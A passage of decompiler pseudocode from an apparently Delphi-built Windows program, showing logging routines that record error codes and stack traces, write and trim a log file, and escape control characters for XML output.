        int a3@<ecx>,
        int a4@<edi>,
        int a5@<esi>,
        long double a6@<st0>,
        char a7)
{
  DWORD v7; // eax
  int v8; // edx
  unsigned int v10[2]; // [esp-24h] [ebp-4Ch] BYREF
  int *v11; // [esp-1Ch] [ebp-44h]
  unsigned int v12[2]; // [esp-18h] [ebp-40h] BYREF
  int *v13; // [esp-10h] [ebp-38h]
  unsigned int v14[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v15; // [esp-4h] [ebp-2Ch]
  int v16; // [esp+4h] [ebp-24h] BYREF
  int v17; // [esp+8h] [ebp-20h] BYREF
  __int32 v18; // [esp+Ch] [ebp-1Ch] BYREF
  int *v19; // [esp+10h] [ebp-18h] BYREF
  int v20; // [esp+14h] [ebp-14h] BYREF
  DWORD LastError_1; // [esp+18h] [ebp-10h]
  int v22; // [esp+1Ch] [ebp-Ch]
  void *v23; // [esp+20h] [ebp-8h]
  int v24; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v16 = 0;
  v18 = 0;
  v17 = 0;
  v22 = a3;
  v23 = a2;
  v24 = a1;
  v15 = &savedregs;
  v14[1] = (unsigned int)&loc_433A95;
  v14[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v14);
  LastError_1 = GetLastError_1();
  sub_407968(&v17, v23, L" GetLastError=");
  sub_424890(v22, v17, (int)&str___10[1], &v18);
  sub_433830(v24, 2, LastError_1, v18);
  if ( a7 )
  {
    v20 = sub_405568((int)cls_CrossPlatform_TUnicodeStringList, 1);
    v13 = &savedregs;
    v12[1] = (unsigned int)&loc_433A73;
    v12[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v12);
    v7 = sub_4239A0();
    v19 = sub_4309F0(0, v7, a6);
    if ( v19 )
    {
      v11 = &savedregs;
      v10[1] = (unsigned int)&loc_433A56;
      v10[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
      __writefsdword(0, (unsigned int)v10);
      sub_431130((int)v19, v20, 7u, a4);
      if ( *(int *)(v20 + 8) > 0 )
      {
        sub_4294E0(v20, 0, (int)L"Start stack", 0, a4, a5);
        Guitesting::TGUITestCase::Hide(v20, L"Finish stack");
        sub_4289A0(v20, (int)&v16);
        LOBYTE(v8) = 2;
        (*(void (__fastcall **)(int, int, int))(*(_DWORD *)v24 + 8))(v24, v8, v16);
      }
      __writefsdword(0, v10[0]);
      v11 = (int *)&loc_433A5D;
      unknown_libname_94(&v19);
    }
    __writefsdword(0, v12[0]);
    v13 = (int *)&loc_433A7A;
    unknown_libname_94(&v20);
  }
  __writefsdword(0, v14[0]);
  v15 = (int *)&loc_433A9C;
  return sub_406CA4((int)&v16, 3);
}
// 433A3D: variable 'v8' is possibly undefined
// 41C304: using guessed type int __fastcall unknown_libname_94(_DWORD);
// 4232BC: using guessed type int (*cls_CrossPlatform_TUnicodeStringList[3])();
// 429130: using guessed type int __fastcall Guitesting::TGUITestCase::Hide(_DWORD, _DWORD);
// 433AB0: using guessed type wchar_t aGetlasterror[15];
// 433AD4: using guessed type _strings str___10[1];
// 433AF0: using guessed type wchar_t aStartStack[12];
// 433B14: using guessed type wchar_t aFinishStack_0[13];

//----- (00433B30) --------------------------------------------------------
_DWORD *__fastcall sub_433B30(int a1, int a2, const void *a3)
{
  int v3; // ecx
  _WORD *v4; // eax
  int v5; // eax
  int v6; // ecx
  int v7; // edx
  int v9; // [esp-10h] [ebp-24h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v11; // [esp-8h] [ebp-1Ch]
  int *v12; // [esp-4h] [ebp-18h]
  void *v13; // [esp+0h] [ebp-14h]
  __int32 v14; // [esp+4h] [ebp-10h] BYREF
  LPCVOID lpAddress; // [esp+8h] [ebp-Ch]
  int v16; // [esp+Ch] [ebp-8h]
  int v17; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v14 = 0;
  lpAddress = a3;
  v16 = a2;
  v17 = a1;
  v12 = &savedregs;
  v11 = &loc_433BB3;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_406C44(&v14);
  sub_407890(&v14, 1024, v3);
  v9 = System::__linkproc__ LStrLen(v14);
  v4 = (_WORD *)sub_4071C0(&v14);
  v5 = sub_41A408((int *)v16, lpAddress, v4, v9);
  sub_407890(&v14, v5, v6);
  LOBYTE(v7) = 4;
  (*(void (__fastcall **)(int, int, __int32, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v17 + 8))(
    v17,
    v7,
    v14,
    ExceptionList);
  __writefsdword(0, (unsigned int)v11);
  v13 = &loc_433BBA;
  return sub_406C44(&v14);
}
// 433B63: variable 'v3' is possibly undefined
// 433B8B: variable 'v6' is possibly undefined
// 433B9A: variable 'v7' is possibly undefined
// 4070F8: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);

//----- (00433BC0) --------------------------------------------------------
BOOL __fastcall sub_433BC0(int a1)
{
  return ReleaseMutex(*(HANDLE *)(a1 + 4));
}

//----- (00433BE0) --------------------------------------------------------
_DWORD *__fastcall sub_433BE0(int a1, int a2, int a3)
{
  int v3; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v6; // [esp-8h] [ebp-1Ch]
  int *v7; // [esp-4h] [ebp-18h]
  __int32 v8; // [esp+4h] [ebp-10h] BYREF
  int v9; // [esp+8h] [ebp-Ch]
  int v10; // [esp+Ch] [ebp-8h]
  int v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = 0;
  v9 = a3;
  v10 = a2;
  v11 = a1;
  v7 = &savedregs;
  v6 = &loc_433C40;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a1 )
  {
    sub_424890(v9, v10, (int)&str___11[1], &v8);
    LOBYTE(v3) = 1;
    (*(void (__fastcall **)(int, int, __int32, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *))(*(_DWORD *)v11 + 8))(
      v11,
      v3,
      v8,
      v7,
      v6,
      ExceptionList);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v7 = (int *)&loc_433C47;
  return sub_406C44(&v8);
}
// 433C27: variable 'v3' is possibly undefined
// 433C50: using guessed type _strings str___11[1];

//----- (00433C60) --------------------------------------------------------
__int64 sub_433C60()
{
  return 1111120000000i64;
}

//----- (00433C90) --------------------------------------------------------
_DWORD *__fastcall sub_433C90(int *a1)
{
  DWORD v1; // eax
  DWORD v2; // eax
  int *v4; // [esp-28h] [ebp-3Ch]
  _DWORD v5[3]; // [esp-Ch] [ebp-20h] BYREF
  int v6; // [esp+0h] [ebp-14h] BYREF
  int v7; // [esp+4h] [ebp-10h] BYREF
  DWORD v8; // [esp+8h] [ebp-Ch]
  __int32 v9; // [esp+Ch] [ebp-8h] BYREF
  int *v10; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v8 = 0;
  v7 = 0;
  v6 = 0;
  v10 = a1;
  v5[2] = &savedregs;
  v5[1] = &loc_433D5C;
  v5[0] = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v5);
  v1 = sub_423990();
  unknown_libname_74(v1, v10);
  v8 = sub_4239A0();
  if ( sub_4239B0() == v8 )
  {
    if ( !byte_466C0C )
      goto LABEL_7;
  }
  else
  {
    byte_466C0C = 1;
  }
  v2 = sub_423990();
  unknown_libname_74(v2, &v7);
  unknown_libname_74(v8, &v6);
  sub_4079F0(v10, 3);
  sub_427040(&v9);
  if ( v9 )
  {
    v4 = dword_433D98;
    sub_4079F0(v10, 4);
  }
LABEL_7:
  __writefsdword(0, (unsigned int)v4);
  sub_406CA4((int)&v6, 2);
  return sub_406C44(&v9);
}
// 433D3E: variable 'v4' is possibly undefined
// 4151BC: using guessed type int __fastcall unknown_libname_74(_DWORD, _DWORD);
// 433D6C: using guessed type _strings str___1[1];
// 433D98: using guessed type int dword_433D98[2];
// 466C0C: using guessed type char byte_466C0C;

//----- (00433DA0) --------------------------------------------------------
_DWORD *__usercall sub_433DA0@<eax>(int a1@<eax>, unsigned __int8 a2@<dl>, void *a3@<ecx>, long double a4@<st0>)
{
  int v4; // ecx
  int v5; // edx
  struct _EXCEPTION_REGISTRATION_RECORD *v7; // [esp-34h] [ebp-5Ch] BYREF
  void *v8; // [esp-30h] [ebp-58h]
  int *v9; // [esp-2Ch] [ebp-54h]
  _strings *v10; // [esp-28h] [ebp-50h]
  int v11; // [esp-24h] [ebp-4Ch]
  void *v12; // [esp-20h] [ebp-48h]
  _strings *v13; // [esp-1Ch] [ebp-44h]
  __int32 v14; // [esp-18h] [ebp-40h]
  const wchar_t *v15; // [esp-14h] [ebp-3Ch]
  wchar_t *v16; // [esp-10h] [ebp-38h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-34h] BYREF
  void *v18; // [esp-8h] [ebp-30h]
  int *v19; // [esp-4h] [ebp-2Ch]
  void *v20; // [esp+0h] [ebp-28h]
  int v21; // [esp+4h] [ebp-24h] BYREF
  int v22; // [esp+8h] [ebp-20h] BYREF
  __int32 v23; // [esp+Ch] [ebp-1Ch] BYREF
  double v24; // [esp+10h] [ebp-18h]
  void *v25; // [esp+18h] [ebp-10h] BYREF
  void *v26; // [esp+1Ch] [ebp-Ch]
  unsigned __int8 v27; // [esp+23h] [ebp-5h]
  int v28; // [esp+24h] [ebp-4h]
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v21 = 0;
  v22 = 0;
  v23 = 0;
  v25 = 0;
  v26 = a3;
  v27 = a2;
  v28 = a1;
  v19 = &savedregs;
  v18 = &loc_433EF1;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( a2 || *(_BYTE *)(v28 + 42) )
  {
    Sysutils::Now();
    v24 = a4;
    v16 = (&off_466BF4)[v27];
    v15 = L": ";
    sub_425090(off_466BE8, &v23, v4, HIDWORD(COERCE_UNSIGNED_INT64(a4)), COERCE_UNSIGNED_INT64(a4));
    v14 = v23;
    v13 = &str___12[1];
    sub_4079F0((int *)&v25, 4);
    v12 = v25;
    sub_433C90(&v22);
    v11 = v22;
    v10 = &str___12[1];
    sub_4079F0((int *)&v25, 3);
    sub_407910((volatile __int32 *)&v25, v26);
    sub_434210(v28, (int)v25);
    sub_432F80(v28);
    v9 = &savedregs;
    v8 = &loc_433EC7;
    v7 = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&v7);
    if ( (unsigned __int8)(v27 - 2) < 3u )
      ++*(_DWORD *)(v28 + 12);
    sub_407968(&v21, v25, L"\r\n");
    sub_434240(v28, (BOOL *)v21);
    LOBYTE(v5) = v27;
    (**(void (__fastcall ***)(int, int, void *, struct _EXCEPTION_REGISTRATION_RECORD *, wchar_t *, const wchar_t *, __int32, _strings *, void *, int, _strings *, int *, void *, struct _EXCEPTION_REGISTRATION_RECORD *, _DWORD, _DWORD, void *))v28)(
      v28,
      v5,
      v26,
      ExceptionList,
      v16,
      v15,
      v14,
      v13,
      v12,
      v11,
      v10,
      v9,
      v8,
      v7,
      HIDWORD(v24),
      LODWORD(v24),
      v25);
    __writefsdword(0, (unsigned int)v18);
    v20 = &loc_433ECE;
    sub_433BC0(v28);
  }
  __writefsdword(0, (unsigned int)ExceptionList);
  v19 = (int *)&loc_433EF8;
  sub_406CA4((int)&v21, 3);
  return sub_406C44(&v25);
}
// 433E08: variable 'v4' is possibly undefined
// 433EAF: variable 'v5' is possibly undefined
// 433F0C: using guessed type wchar_t asc_433F0C[3];
// 433F18: using guessed type _strings str___12[1];
// 433F30: using guessed type wchar_t asc_433F30[3];
// 466BE8: using guessed type wchar_t *off_466BE8;
// 466BF4: using guessed type wchar_t *off_466BF4;

//----- (00433F40) --------------------------------------------------------
_DWORD *__fastcall sub_433F40(int a1, void *a2, void *a3)
{
  int v3; // eax
  void *v4; // eax
  int v5; // eax
  int v6; // eax
  char v7; // zf
  const void *v8; // eax
  int v9; // ebx
  bool v10; // al
  int v11; // eax
  DWORD v13; // [esp-10h] [ebp-44h]
  DWORD v14; // [esp-10h] [ebp-44h]
  unsigned int v15[2]; // [esp-Ch] [ebp-40h] BYREF
  int *v16; // [esp-4h] [ebp-38h]
  int v17; // [esp+4h] [ebp-30h] BYREF
  char v18; // [esp+Bh] [ebp-29h]
  int i; // [esp+Ch] [ebp-28h]
  void *v20; // [esp+10h] [ebp-24h] BYREF
  __int64 v21; // [esp+14h] [ebp-20h]
  __int64 v22; // [esp+1Ch] [ebp-18h]
  bool v23; // [esp+27h] [ebp-Dh]
  void *v24; // [esp+28h] [ebp-Ch]
  HANDLE hFile; // [esp+2Ch] [ebp-8h]
  int v26; // [esp+30h] [ebp-4h]
  int savedregs; // [esp+34h] [ebp+0h] BYREF

  v17 = 0;
  v20 = 0;
  v24 = a3;
  hFile = a2;
  v26 = a1;
  v16 = &savedregs;
  v15[1] = (unsigned int)&loc_4341DC;
  v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  v22 = (int)Sysutils::FileSeek(a2, 0, 1u);
  v21 = v22 - *(_QWORD *)(v26 + 32);
  v18 = 0;
  if ( v21 <= 0 )
  {
    *(_QWORD *)(v26 + 32) = v22 - 0x8000;
    if ( *(int *)(v26 + 36) < 0 )
    {
      v3 = v26;
      *(_DWORD *)(v26 + 32) = 0;
      *(_DWORD *)(v3 + 36) = 0;
    }
    v21 = v22 - *(_QWORD *)(v26 + 32);
    v18 = 1;
  }
  if ( v21 > 0x8000 )
    v21 = 0x8000i64;
  sub_406C68(&v20);
  if ( v21 > 0 )
  {
    sub_4075BC(&v20, v21, 0);
    Sysutils::FileSeek(hFile, *(_QWORD *)(v26 + 32), 0);
    v13 = System::__linkproc__ LStrLen(v20);
    v4 = (void *)sub_4071C8(&v20);
    Sysutils::FileRead(hFile, v4, v13);
    i = System::__linkproc__ LStrLen(v20);
    if ( i > 0 )
    {
      while ( *((char *)v20 + i - 1) != 10 )
      {
        if ( --i <= 0 )
          goto LABEL_12;
      }
      sub_4075BC(&v20, i, 0);
    }
LABEL_12:
    if ( v18 )
    {
      for ( i = 1; ; ++i )
      {
        v5 = System::__linkproc__ LStrLen(v20);
        if ( v5 < i )
          break;
        if ( *((char *)v20 + i - 1) == 10 )
        {
          sub_407510((int)v20, i + 1, 0x7FFFFFFF, &v20);
          break;
        }
      }
    }
    if ( v24 )
    {
      v6 = System::__linkproc__ LStrLen(v24);
      sub_407510((int)v20, 1, v6, &v17);
      sub_407478(v17, (int)v24);
      if ( !v7 )
        sub_40732C((volatile __int32 *)&v20, v24, v20);
    }
  }
  Sysutils::FileSeek(hFile, 0, 0);
  if ( System::__linkproc__ LStrLen(v20) > 0 )
  {
    v14 = System::__linkproc__ LStrLen(v20);
    v8 = (const void *)sub_4071C8(&v20);
    sub_415794(hFile, v8, v14);
  }
  v10 = 0;
  if ( SetEndOfFile(hFile) )
  {
    v9 = Sysutils::FileSeek(hFile, 0, 1u);
    if ( v9 <= System::__linkproc__ LStrLen(v20) )
      v10 = 1;
  }
  v23 = v10;
  v11 = v26;
  *(_DWORD *)(v26 + 32) = -1;
  *(_DWORD *)(v11 + 36) = -1;
  sub_41581C(hFile);
  if ( !v23 )
    sub_426BB0(*(_DWORD *)(v26 + 16));
  __writefsdword(0, v15[0]);
  v16 = (int *)&loc_4341E3;
  sub_406C68(&v17);
  return sub_406C68(&v20);
}
// 43411D: variable 'v7' is possibly undefined
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 4071C8: using guessed type int __fastcall sub_4071C8(_DWORD);
// 433F40: using guessed type int var_30;

//----- (004341F0) --------------------------------------------------------
void __stdcall sub_4341F0(int a1, int a2, int a3)
{
  ;
}

//----- (00434210) --------------------------------------------------------
void __fastcall sub_434210(int a1, int a2)
{
  const WCHAR *v2; // eax

  if ( *(_BYTE *)(a1 + 41) )
  {
    v2 = (const WCHAR *)sub_407790(a2);
    OutputDebugStringW(v2);
  }
}

//----- (00434240) --------------------------------------------------------
_DWORD *__fastcall sub_434240(int a1, BOOL *a2)
{
  unsigned int v3[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v4; // [esp-4h] [ebp-10h]
  __int32 v5[2]; // [esp+0h] [ebp-Ch] BYREF
  int v6; // [esp+8h] [ebp-4h]
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v5[0] = 0;
  v5[1] = (__int32)a2;
  v6 = a1;
  v4 = &savedregs;
  v3[1] = (unsigned int)&loc_434291;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_40B238(a2, v5);
  sub_4342A0(v6, v5[0], off_466BEC);
  __writefsdword(0, v3[0]);
  v4 = (int *)&loc_434298;
  return sub_406C68(v5);
}
// 466BEC: using guessed type int *off_466BEC;

//----- (004342A0) --------------------------------------------------------
int __fastcall sub_4342A0(int a1, int a2, void *a3)
{
  const WCHAR *v4; // eax
  const WCHAR *v5; // eax
  int v6; // edx
  const void *v7; // eax
  __int64 v8; // rax
  const void *v9; // eax
  DWORD v10; // eax
  unsigned int v11; // [esp-10h] [ebp-34h]
  DWORD v12; // [esp-10h] [ebp-34h]
  DWORD v13; // [esp-10h] [ebp-34h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v15; // [esp-8h] [ebp-2Ch]
  int *v16; // [esp-4h] [ebp-28h]
  DWORD FileAttributesW; // [esp+0h] [ebp-24h]
  __int64 v18; // [esp+4h] [ebp-20h]
  unsigned int v19; // [esp+10h] [ebp-14h]
  HANDLE hFile; // [esp+14h] [ebp-10h]
  void *v21; // [esp+18h] [ebp-Ch]
  int v22; // [esp+1Ch] [ebp-8h]
  int v23; // [esp+20h] [ebp-4h]
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v21 = a3;
  v22 = a2;
  v23 = a1;
  sub_432F80(a1);
  v16 = &savedregs;
  v15 = &loc_434492;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !*(_DWORD *)(v23 + 16) )
    return System::__linkproc__ TryFinallyExit(ExceptionList, v15, v16);
  v19 = 1;
  while ( 1 )
  {
    hFile = *(HANDLE *)(v23 + 8);
    if ( (HANDLE)*off_46814C == hFile )
    {
      v4 = (const WCHAR *)sub_407790(*(_DWORD *)(v23 + 16));
      FileAttributesW = GetFileAttributesW(v4);
      if ( FileAttributesW != -1 && (FileAttributesW & 1) != 0 )
      {
        v11 = FileAttributesW & 0xFFFFFFFE;
        v5 = (const WCHAR *)sub_407790(*(_DWORD *)(v23 + 16));
        SetFileAttributesW(v5, v11);
      }
      hFile = sub_426D60(*(_DWORD *)(v23 + 16), 515);
    }
    if ( (HANDLE)*off_46814C == hFile && !(unsigned __int8)sub_426B00(*(_DWORD *)(v23 + 16)) )
      hFile = sub_426D60(*(_DWORD *)(v23 + 16), 512);
    if ( (HANDLE)*off_46814C == hFile )
    {
      v10 = unknown_libname_30(10);
      Sleep_0(v10);
      ++v19;
      goto LABEL_27;
    }
    LODWORD(v18) = Sysutils::FileSeek(hFile, 0i64, 2u);
    HIDWORD(v18) = v6;
    if ( *(_DWORD *)(v23 + 36) == -1 && *(_DWORD *)(v23 + 32) == -1 )
      *(_QWORD *)(v23 + 32) = v18;
    if ( !v18 )
      break;
    LODWORD(v8) = (*(int (__fastcall **)(int))(*(_DWORD *)v23 + 12))(v23);
    if ( v8 >= v18 )
      goto LABEL_21;
    *(_DWORD *)(v23 + 8) = *off_46814C;
    sub_433F40(v23, hFile, v21);
LABEL_27:
    if ( v19 >= 5 )
      goto LABEL_28;
  }
  if ( v21 )
  {
    v12 = System::__linkproc__ LStrLen(v21);
    v7 = (const void *)sub_4074F8((int)v21);
    sub_415794(hFile, v7, v12);
  }
LABEL_21:
  if ( v22 )
  {
    v13 = System::__linkproc__ LStrLen(v22);
    v9 = (const void *)sub_4074F8(v22);
    sub_415794(hFile, v9, v13);
  }
  if ( *(_BYTE *)(v23 + 20) )
    *(_DWORD *)(v23 + 8) = hFile;
  else
    sub_41581C(hFile);
LABEL_28:
  __writefsdword(0, (unsigned int)ExceptionList);
  v16 = (int *)&loc_434499;
  return sub_433BC0(v23);
}
// 43439B: variable 'v6' is possibly undefined
// 4343FC: variable 'v8' is possibly undefined
// 405060: using guessed type int __fastcall unknown_libname_30(_DWORD);
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 407104: using guessed type int __fastcall System::__linkproc__ LStrLen(_DWORD);
// 46814C: using guessed type int *off_46814C;

//----- (004344A0) --------------------------------------------------------
char sub_4344A0()
{
  char result; // al

  if ( !++dword_46EDB8 )
    return sub_431DA0();
  return result;
}
// 46EDB8: using guessed type int dword_46EDB8;

//----- (004347C0) --------------------------------------------------------
int __usercall sub_4347C0@<eax>(_DWORD *a1@<eax>, int a2@<edx>, int a3@<edi>)
{
  unsigned int v4[2]; // [esp-Ch] [ebp-14h] BYREF
  int *v5; // [esp-4h] [ebp-Ch]
  _DWORD *v6; // [esp+0h] [ebp-8h]
  unsigned __int8 v7; // [esp+7h] [ebp-1h]
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  v6 = (_DWORD *)sub_4350D0((int)&cls_NOMXML_TXMLReader, 1, a1, a2);
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_434807;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v7 = sub_435920((int)v6, a3);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_43480E;
  sub_405598(v6);
  return v7;
}
// 434670: using guessed type __int16 cls_NOMXML_TXMLReader;

//----- (00434820) --------------------------------------------------------
int __userpurge sub_434820@<eax>(_DWORD *a1@<eax>, volatile __int32 *a2@<edx>, int a3@<edi>, int a4)
{
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v7; // [esp-8h] [ebp-1Ch]
  int *v8; // [esp-4h] [ebp-18h]
  _DWORD *v9; // [esp+8h] [ebp-Ch]
  int v10; // [esp+Ch] [ebp-8h]
  volatile __int32 *v11; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v11 = a2;
  if ( a2 )
    *a2 = 0;
  v10 = 0;
  sub_406C44(v11);
  v9 = (_DWORD *)unknown_libname_142(a4);
  v8 = &savedregs;
  v7 = &loc_4348B4;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( (unsigned __int8)sub_4347C0(a1, (int)v9, a3) )
  {
    v10 = v9[7];
    v9[7] = 0;
    __writefsdword(0, (unsigned int)ExceptionList);
    v8 = (int *)&loc_4348BB;
    sub_405598(v9);
  }
  else
  {
    sub_406FE8(v11, v9[4]);
    System::__linkproc__ TryFinallyExit(ExceptionList, v7, v8);
  }
  return v10;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 437060: using guessed type _DWORD __stdcall unknown_libname_142(_DWORD);

//----- (004348D0) --------------------------------------------------------
int __usercall sub_4348D0@<eax>(int result@<eax>, int a2)
{
  int v2; // esi
  _DWORD *v3; // edx
  int v4; // ebx
  int v5; // edx

  v2 = result;
  v3 = (_DWORD *)(a2 - 12);
  if ( result )
    result = *(_DWORD *)(result - 4);
  v4 = result;
  if ( result )
  {
    if ( result >= 1 )
    {
      while ( *(_BYTE *)(v2 + result - 1) != 10 )
      {
        ++*v3;
        if ( !--result )
          goto LABEL_8;
      }
      *v3 = v4 - result;
    }
LABEL_8:
    v5 = sub_4074F8(v2);
    return (*(int (__fastcall **)(_DWORD, int, int))(**(_DWORD **)(a2 - 16) + 16))(*(_DWORD *)(a2 - 16), v5, v4);
  }
  return result;
}

//----- (00434930) --------------------------------------------------------
_DWORD *__usercall sub_434930@<eax>(BOOL *a1@<eax>, int a2)
{
  unsigned int v3[3]; // [esp-24h] [ebp-28h] BYREF
  unsigned int v4[2]; // [esp-18h] [ebp-1Ch] BYREF
  int *v5; // [esp-10h] [ebp-14h]
  __int32 v6; // [esp+0h] [ebp-4h] BYREF
  int savedregs; // [esp+4h] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_4349BD;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  v3[2] = (unsigned int)&savedregs;
  v3[1] = (unsigned int)&loc_43496A;
  v3[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v3);
  sub_40B238(a1, &v6);
  __writefsdword(0, v3[0]);
  sub_4348D0(v6, a2);
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_4349C4;
  return sub_406C68(&v6);
}

//----- (004349F0) --------------------------------------------------------
int __cdecl sub_4349F0(int a1)
{
  int result; // eax

  if ( (*(_BYTE *)(a1 - 17) & 0x10) != 0 )
  {
    sub_4348D0((int)*off_4680C4, a1);
  }
  else
  {
    result = a1;
    if ( (*(_BYTE *)(a1 - 17) & 2) == 0 )
      return result;
    sub_4348D0((int)dword_434A48, a1);
  }
  return sub_4348D0(*(_DWORD *)(a1 - 8), a1);
}
// 434A48: using guessed type int dword_434A48[2];
// 4680C4: using guessed type int **off_4680C4;

//----- (00434A50) --------------------------------------------------------
int __usercall sub_434A50@<eax>(int result@<eax>, int a2@<ecx>, int a3)
{
  int v3; // edx

  v3 = *(_DWORD *)(a3 - 4);
  if ( v3 )
    v3 = *(_DWORD *)(v3 - 4);
  if ( v3 < result )
    return (int)sub_407890((_DWORD *)(a3 - 4), 2 * result, a2);
  return result;
}

//----- (00434A80) --------------------------------------------------------
_DWORD *__usercall sub_434A80@<eax>(int a1@<eax>, int a2@<ecx>, int a3)
{
  int v3; // ebx
  int v4; // esi
  wchar_t **v5; // ebx
  int v6; // ecx
  __int16 v7; // bx
  __int32 v8; // ebx
  __int32 v9; // eax
  int v10; // esi
  int v11; // ebx
  int v12; // edi
  int v13; // eax
  unsigned int v15[2]; // [esp-Ch] [ebp-34h] BYREF
  int *v16; // [esp-4h] [ebp-2Ch]
  int v17; // [esp+Ch] [ebp-1Ch]
  int v18; // [esp+10h] [ebp-18h]
  int v19; // [esp+14h] [ebp-14h]
  int v20; // [esp+18h] [ebp-10h]
  int v21; // [esp+1Ch] [ebp-Ch]
  int v22; // [esp+20h] [ebp-8h]
  __int32 v23; // [esp+24h] [ebp-4h] BYREF
  int savedregs; // [esp+28h] [ebp+0h] BYREF

  v23 = 0;
  v22 = a1;
  v16 = &savedregs;
  v15[1] = (unsigned int)&loc_434C32;
  v15[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v15);
  v3 = a1;
  if ( a1 )
    a1 = *(_DWORD *)(a1 - 4);
  v20 = a1;
  sub_434A50(a1, a2, a3);
  v4 = 0;
  v18 = v3;
  if ( v3 )
    v18 = *(_DWORD *)(v18 - 4);
  if ( v18 > 0 )
  {
    v19 = v18;
    v21 = 1;
    while ( 1 )
    {
      v5 = &off_466C10;
      sub_406C44(&v23);
      while ( *(_WORD *)(v22 + 2 * v21 - 2) != *((_WORD *)v5 + 2) )
      {
        v5 += 2;
        if ( !*((_WORD *)v5 + 2) )
          goto LABEL_11;
      }
      sub_407030(&v23, (__int32)*v5);
LABEL_11:
      if ( v23 )
        goto LABEL_19;
      v7 = *(_WORD *)(v22 + 2 * v21 - 2);
      if ( v7 == 9 )
        break;
      if ( v7 == 13 )
      {
        sub_407030(&v23, (__int32)L"#13");
        goto LABEL_19;
      }
      if ( v7 == 10 )
      {
        sub_407030(&v23, (__int32)L"#10");
        goto LABEL_19;
      }
      ++v4;
      *(_WORD *)(sub_4071C0((volatile __int32 *)(a3 - 4)) + 2 * v4 - 2) = v7;
LABEL_27:
      ++v21;
      if ( !--v19 )
        goto LABEL_28;
    }
    sub_407030(&v23, (__int32)L"#9");
LABEL_19:
    v8 = v23;
    v9 = v23;
    if ( v23 )
      v9 = *(_DWORD *)(v23 - 4);
    v20 += v9 + 1;
    sub_434A50(v20, v6, a3);
    v10 = v4 + 1;
    *(_WORD *)(sub_4071C0((volatile __int32 *)(a3 - 4)) + 2 * v10 - 2) = 38;
    v17 = v8;
    if ( v8 )
      v17 = *(_DWORD *)(v17 - 4);
    v11 = v17;
    if ( v17 > 0 )
    {
      v12 = 1;
      do
      {
        ++v10;
        v13 = sub_4071C0((volatile __int32 *)(a3 - 4));
        *(_WORD *)(v13 + 2 * v10 - 2) = *(_WORD *)(v23 + 2 * v12++ - 2);
        --v11;
      }
      while ( v11 );
    }
    v4 = v10 + 1;
    *(_WORD *)(sub_4071C0((volatile __int32 *)(a3 - 4)) + 2 * v4 - 2) = 59;
    goto LABEL_27;
  }
LABEL_28:
  *(_DWORD *)(a3 - 24) = v20;
  __writefsdword(0, v15[0]);
  v16 = (int *)&loc_434C39;
  return sub_406C44(&v23);
}
// 434B9E: variable 'v6' is possibly undefined
// 434C4C: using guessed type wchar_t a9[3];
